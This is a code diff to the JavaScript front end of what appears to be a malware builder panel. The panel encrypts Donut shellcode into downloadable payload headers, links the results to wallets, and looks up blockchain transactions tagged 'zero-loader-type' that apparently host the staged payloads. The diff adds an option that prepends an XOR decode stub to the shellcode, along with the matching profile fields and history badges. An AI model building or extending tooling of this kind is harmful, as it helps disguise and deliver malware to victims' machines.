@@ -297,6 +297,8 @@ $("#form-encrypt").addEventListener("submit", async (e) => {
   const walletId = $("#enc-wallet-id").value;
   if (walletId) fd.append("wallet_id", walletId);
 
+  fd.append("wrap", $("#enc-wrap")?.checked ? "1" : "0");
+
   try {
     const r = await fetch("/api/encrypt", { method: "POST", body: fd });
     const j = await r.json();
@@ -700,6 +702,7 @@ function _renderProfileList(profiles, listEl, emptyEl, loadFn, delFn) {
     } else {
       if (p.shellcode_job_id) { const j = _donutJobs.find(x => x.id === p.shellcode_job_id); rows.push(["Shellcode", j ? (j.label || j.id.slice(0,8)) : p.shellcode_job_id.slice(0,8)]); }
       if (p.wallet_id) { const w = _wallets.find(x => x.id === p.wallet_id); rows.push(["Wallet", w ? w.name : p.wallet_id.slice(0,12) + "…"]); }
+      if (p.wrap) rows.push(["Wrap", "yes"]);
     }
     const overlay = document.createElement("div");
     overlay.className = "profile-popup-overlay";
@@ -768,6 +771,7 @@ function loadEncProfile(id) {
       wWrap.querySelectorAll(".cdd-item").forEach(i => i.classList.remove("cdd-selected"));
     }
   }
+  if ($("#enc-wrap")) $("#enc-wrap").checked = !!p.wrap;
   $$(".tab").forEach(t => t.classList.toggle("active", t.dataset.tab === "encrypt"));
   $$(".panel").forEach(pp => pp.classList.toggle("active", pp.id === "panel-encrypt"));
   _openEncSaveRow();
@@ -823,6 +827,7 @@ function collectEncryptData() {
   return {
     shellcode_job_id: $("#enc-sc-job")?.value || "",
     wallet_id:        $("#enc-wallet-id")?.value || "",
+    wrap:             $("#enc-wrap")?.checked || false,
   };
 }
 function collectBuildData() {
@@ -957,6 +962,7 @@ function renderEncryptHistory() {
     const donutBadge = j.donut_label
       ? `<span class="ji-label-badge">${j.donut_label}</span>`
       : "";
+    const wrapBadge = j.wrapped ? `<span class="ji-label-badge" title="XOR decode stub prepended">wrapped</span>` : "";
 
     // download links
     let dls = `<a class="btn-xs" href="/api/encrypt/history/${j.id}/download/payload_h">↓ Payload.h</a>`;
@@ -984,7 +990,7 @@ function renderEncryptHistory() {
       </div>
       <div class="hist-meta">
         <span class="ji-id">#${j.id}</span>
-        ${donutBadge}
+        ${donutBadge}${wrapBadge}
         <span>${j.dat_size ? fmtSize(j.dat_size) + " enc" : ""}</span>
         ${walletBadge}
         ${txBadge}
@@ -1466,12 +1472,14 @@ async function doLookup() {
     if (!txs.length) {
       writeConsole(out, "[*] No transactions yet.\n");
     } else {
+      const SEP = "─".repeat(48);
       for (const tx of txs) {
         const blockStr = tx.block ? `block #${tx.block}` : "no block?";
-        const appName = tx.tags?.["App-Name"] || "";
-        const txType  = tx.tags?.["zero-loader-type"] || "";
-        const tagStr  = txType ? `  [${txType}]` : (appName ? `  [${appName}]` : "");
-        let line = `\n── ${tx.tx_id}  (${blockStr})${tagStr}\n    ${tx.url}\n`;
+        const appName  = tx.tags?.["App-Name"] || "";
+        const txType   = tx.tags?.["zero-loader-type"] || "";
+        const tagStr   = txType ? `  [${txType}]` : (appName ? `  [${appName}]` : "");
+        const sizeStr  = tx.data_size != null ? `  ${fmtSize(tx.data_size)}` : "";
+        let line = `\n${SEP}\n── ${tx.tx_id}  (${blockStr})${tagStr}${sizeStr}\n    ${tx.url}\n`;
         if (tx.pending) {
           line += `    ⏳ gateway 404 — data not yet served (may take 30-60 min after block confirmation)\n`;
         } else if (tx.error) {
@@ -1486,6 +1494,7 @@ async function doLookup() {
         writeConsole(out, line);
       }
       writeConsole(out, "\n[+] Scan complete.\n", { ok: true });
+      out.scrollTop = 0;
     }
   } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
   finally { btn.disabled = false; }
